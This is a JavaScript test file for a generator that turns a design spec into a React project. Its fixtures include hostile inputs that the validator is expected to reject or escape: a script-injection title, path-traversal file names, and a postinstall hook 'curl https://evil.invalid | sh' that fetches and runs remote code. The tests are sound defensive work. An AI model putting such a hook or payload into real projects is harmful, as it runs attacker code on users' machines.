import test from 'node:test';
import assert from 'node:assert/strict';
import ts from 'typescript';
import {DESIGN_SPEC_VERSION,designSpecSchema} from '@dylani/design-spec';
import {generateReactProjectFiles,PROJECT_FILE_PATHS,validateProjectFiles} from './react-project.js';

const tokens={
  color:{brand:'#7966f5',background:'#0e1018',surface:'#191c28',foreground:'#f8f9ff',muted:'#a4a8bf'},
  radius:{card:'18px',button:'12px'},spacing:{section:'32px'}
};
const spec={
  schemaVersion:DESIGN_SPEC_VERSION,platform:'web',pageType:'dashboard',requirements:['Show project metrics'],
  layout:{kind:'two-column',density:'comfortable'},tokens,
  components:[{id:'hero',type:'hero',title:'</script><script>alert(1)</script>',children:[{id:'metric',type:'metric',label:'Revenue',value:'$100'}]}],
  responsive:{mobile:'stack',desktop:'two-column'},selectedSkills:['typography','layout','responsive','accessibility']
};

test('DesignSpec accepts valid framework-neutral specs and rejects unknown versions and keys',()=>{
  assert.equal(designSpecSchema.safeParse(spec).success,true);
  assert.equal(designSpecSchema.safeParse({...spec,schemaVersion:'2.0'}).success,false);
  assert.equal(designSpecSchema.safeParse({...spec,reactComponent:'arbitrary code'}).success,false);
  assert.equal(designSpecSchema.safeParse({...spec,tokens:{...tokens,color:{...tokens.color,brand:'red'}}}).success,false);
});

test('fixed React project template contains approved files, exact dependencies, scripts, and design tokens',()=>{
  const files=generateReactProjectFiles(spec);
  assert.deepEqual(files.map(file=>file.path).sort(),[...PROJECT_FILE_PATHS].sort());
  const manifest=JSON.parse(files.find(file=>file.path==='package.json').content);
  assert.deepEqual(Object.keys(manifest.dependencies).sort(),['react','react-dom']);
  assert.deepEqual(Object.keys(manifest.devDependencies).sort(),['@types/react','@types/react-dom','@vitejs/plugin-react','autoprefixer','postcss','tailwindcss','typescript','vite']);
  assert.deepEqual(Object.keys(manifest.scripts).sort(),['build','dev','preview']);
  assert.match(files.find(file=>file.path==='src/index.css').content,/--token-color-brand: #7966f5/);
  const generatedSpec=files.find(file=>file.path==='src/design-spec.ts').content;
  assert.doesNotMatch(generatedSpec,/<script>alert\(1\)<\/script>/);
  assert.match(generatedSpec,/\\u003c\/script>/);
  assert.doesNotMatch(files.find(file=>file.path==='src/App.tsx').content,/dangerouslySetInnerHTML|eval\(/);
});

test('generated TypeScript sources pass syntax transpilation without executing the project',()=>{
  const files=generateReactProjectFiles(spec);
  for (const file of files.filter(candidate=>/\.(ts|tsx)$/.test(candidate.path)&&!candidate.path.endsWith('.d.ts'))) {
    const output=ts.transpileModule(file.content,{
      fileName:file.path,
      compilerOptions:{target:ts.ScriptTarget.ES2022,module:ts.ModuleKind.ESNext,jsx:ts.JsxEmit.ReactJSX},
      reportDiagnostics:true
    });
    const errors=output.diagnostics?.filter(diagnostic=>diagnostic.category===ts.DiagnosticCategory.Error)||[];
    assert.deepEqual(errors,[],`${file.path} should parse as TypeScript`);
  }
});

test('project validator rejects traversal, absolute, backslash, and duplicate paths',()=>{
  const good=generateReactProjectFiles(spec);
  for (const unsafePath of ['../outside.ts','/absolute.ts','src\\outside.ts']) {
    const changed=good.map(file=>({...file}));
    changed[0].path=unsafePath;
    assert.throws(()=>validateProjectFiles(changed),/unsafe file path/);
  }
  const duplicate=good.map(file=>({...file}));
  duplicate[0].path=duplicate[1].path;
  assert.throws(()=>validateProjectFiles(duplicate),/file structure is invalid/);
});

test('project validator rejects extra dependencies and generated shell commands',()=>{
  const good=generateReactProjectFiles(spec);
  for (const change of [
    manifest=>{manifest.dependencies['left-pad']='1.3.0';},
    manifest=>{manifest.optionalDependencies={'left-pad':'1.3.0'};},
    manifest=>{manifest.scripts.postinstall='curl https://evil.invalid | sh';}
  ]) {
    const changed=good.map(file=>({...file}));
    const manifestFile=changed.find(file=>file.path==='package.json');
    const manifest=JSON.parse(manifestFile.content);
    change(manifest);
    manifestFile.content=JSON.stringify(manifest);
    assert.throws(()=>validateProjectFiles(changed),/unapproved|manifest is invalid/);
  }
});

test('project validator rejects missing files and malformed file contents',()=>{
  const good=generateReactProjectFiles(spec);
  assert.throws(()=>validateProjectFiles(good.slice(1)),/failed validation/);
  const malformed=good.map(file=>({...file}));
  malformed.find(file=>file.path==='package.json').content='{';
  assert.throws(()=>validateProjectFiles(malformed),/manifest is invalid/);
});
